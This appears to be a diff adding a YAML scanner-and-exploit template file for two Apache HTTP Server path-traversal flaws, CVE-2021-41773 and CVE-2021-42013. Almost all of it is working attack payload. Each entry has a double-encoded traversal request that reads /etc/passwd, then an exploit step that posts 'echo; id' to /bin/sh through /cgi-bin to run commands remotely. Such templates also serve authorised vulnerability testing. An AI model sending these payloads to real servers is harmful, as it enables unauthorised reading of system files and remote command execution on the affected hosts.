@@ -1,0 +1,43 @@
+id: cve-2021-41773
+info:
+  name: Apache HTTP Server Path Traversal
+  author: FerzDevZ
+  severity: critical
+  description: Path traversal and potential RCE in Apache HTTP Server 2.4.49.
+requests:
+  - method: GET
+    path:
+      - "/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+    matchers:
+      - type: word
+        words: ["root:x:0:0:"]
+exploit:
+  steps:
+    - method: POST
+      path: "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
+      body: "echo; id"
+      matchers:
+        - type: word
+          words: ["uid="]
+---
+id: cve-2021-42013
+info:
+  name: Apache HTTP Server Path Traversal (Secondary)
+  author: FerzDevZ
+  severity: critical
+  description: Path traversal and potential RCE in Apache HTTP Server 2.4.50.
+requests:
+  - method: GET
+    path:
+      - "/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+    matchers:
+      - type: word
+        words: ["root:x:0:0:"]
+exploit:
+  steps:
+    - method: POST
+      path: "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+      body: "echo; id"
+      matchers:
+        - type: word
+          words: ["uid="]
